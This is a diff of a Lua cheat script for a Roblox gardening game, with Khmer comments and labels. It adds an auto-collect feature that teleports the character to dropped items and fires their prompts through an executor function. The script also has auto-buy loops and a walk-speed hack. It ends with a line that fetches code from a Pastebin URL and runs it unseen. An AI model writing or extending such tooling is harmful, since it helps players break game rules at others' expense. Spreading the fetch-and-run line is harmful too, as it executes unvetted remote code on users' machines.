@@ -88,14 +88,12 @@ task.spawn(function()
             for _, shop in ipairs(Shops) do
                 for _, item in ipairs(shop.Stock:GetChildren()) do
                     if item and item.Value > 0 and table.find(activeItems, item.Name) then
-                        -- ពិនិត្យមើលទំនិញមួយៗ៖ បើគ្រប់លុយ ទិញភ្លាម!
                         if canAfford(item.Name) then
                             pcall(function()
                                 shop.Event:Fire(item.Name)
                             end)
-                            task.wait(0.05) -- Delay ខ្លីបំផុតដើម្បីទិញបានលឿន
+                            task.wait(0.05)
                         else
-                            -- បើអត់គ្រប់លុយ វានឹងរំលង (continue) ទៅទិញទំនិញផ្សេងទៀតដែលគ្រប់លុយ
                             local now = tick()
                             if not lastBuyAttempt[item.Name] or (now - lastBuyAttempt[item.Name]) > 10 then
                                 lastBuyAttempt[item.Name] = now
@@ -123,6 +121,39 @@ local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local Workspace = game:GetService("Workspace")
 
+-- អថេរ និង មុខងារសម្រាប់ Auto Collect Items
+local autoCollectEnabled = false
+
+local function collectDroppedItems()
+    local droppedItemsFolder = Workspace:FindFirstChild("DroppedItems")
+    
+    if droppedItemsFolder then
+        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+        local humanoidRootPart = character:WaitForChild("HumanoidRootPart", 5)
+        
+        if not humanoidRootPart then return end
+        
+        for _, item in ipairs(droppedItemsFolder:GetChildren()) do
+            if not autoCollectEnabled then break end
+            
+            local promptAnchor = item:FindFirstChild("PromptAnchor")
+            local prompt = promptAnchor and promptAnchor:FindFirstChildOfClass("ProximityPrompt") 
+                           or item:FindFirstChildOfClass("ProximityPrompt")
+            
+            local targetPart = item:IsA("Model") and item.PrimaryPart or item:IsA("BasePart") and item
+            
+            if targetPart and prompt then
+                humanoidRootPart.CFrame = targetPart.CFrame + Vector3.new(0, 3, 0)
+                task.wait(0.3)
+                
+                fireproximityprompt(prompt)
+                
+                task.wait(0.3)
+            end
+        end
+    end
+end
+
 -- Send Setup Modules
 local FruitValueCalc = require(ReplicatedStorage:WaitForChild("SharedModules"):WaitForChild("FruitValueCalc"))
 
@@ -141,7 +172,6 @@ local SeedOptions = {"Carrot", "Strawberry", "Blueberry", "Tulip", "Tomato", "Ap
 "Mushroom", "Green Bean", "Banana", "Grape", "Coconut", "Glow Mushroom", "Dragon Fruit", "Acorn", "Cherry", "Sunflower", "Poison Ivy", "Venus Fly Trap", "Pomegranate",
 "Poison Apple", "Venom Spitter", "Ghost Pepper", "Moon Bloom","Sun Bloom", "Dragon's Breath", "Hypno Bloom", "Rocket Pop", "Fire Fern", "Star Fruit", "Rainbow", "Mega", "Gold", "---New Seed---",
 "Maple Carrot", "Maple Strawberry", "Maple Blueberry",  "Maple Tulip", "Maple Tomato", "Maple Apple","Maple Bamboo", "Maple Corn", "Maple Cactus", "Maple Pineapple", "Maple Mushroom", "Maple Green Bean", "Maple Grape", "Maple Coconut", "Maple Mango", "Maple Dragon Fruit", "Maple Acorn", "Maple Cherry", "Maple Sunflower", "Atlantic Giant Pumpkin", "Maple Venus Fly Trap", "Maple Pomegranate", "Maple Poison Apple", "Maple Venom Spitter", "Conifer Cone", "Amber Cranberry" }
-
 
 local Plots = Workspace:WaitForChild("Gardens")
 local VisitedFruits = {}
@@ -430,6 +460,27 @@ MainTab:CreateToggle({
    end,
 })
 
+-- Toggle សម្រាប់ Auto Collect Items នៅក្នុង MainTab
+MainTab:CreateToggle({
+    Name = '<font size="24"><b>ប្រមូលទំនិញដែលគេទំម្លាក់ </b></font>Auto Collect Items',
+    CurrentValue = false,
+    Flag = "AutoCollectToggle",
+    Callback = function(Value)
+        autoCollectEnabled = Value
+        
+        if autoCollectEnabled then
+            task.spawn(function()
+                while autoCollectEnabled do
+                    pcall(function()
+                        collectDroppedItems()
+                    end)
+                    task.wait(1)
+                end
+            end)
+        end
+    end,
+})
+
 MainTab:CreateSlider({
     Name = '<font size="24"><b>ល្បឿនដើរ</b></font>Walk Speed',
     Range = {16, 100},
@@ -605,9 +656,11 @@ MainTab3:CreateDropdown({
 -- Notification
 HENG:Notify({
    Title = "Script Loaded!",
-   Content = "ដំណើរការជោគជ័យ.......By 2BK2",
-   Duration = 4,
+   Content = ".......ដំណើរការជោគជ័យ........\nបើសិនផ្ញើរMailBoxមិនបានសូមដូរឈ្មោះវាអាចនឺងគ្រប់ក្នុងការផ្ញើរក្នុងមួយថ្ងៃ\nច្បាប់Gameអាចផ្ញើរបាន\n-ផ្ញើរបាន5ដងក្នុង 1 Username\n-ផ្ញើរបាន50ដងក្នុងមួយថ្ងៃ",
+   Duration = 20,
    Image = 4483362458,
 })
+
+task.wait(6)
 
 loadstring(game:HttpGet("https://pastebin.com/raw/9nNXtJRn"))()
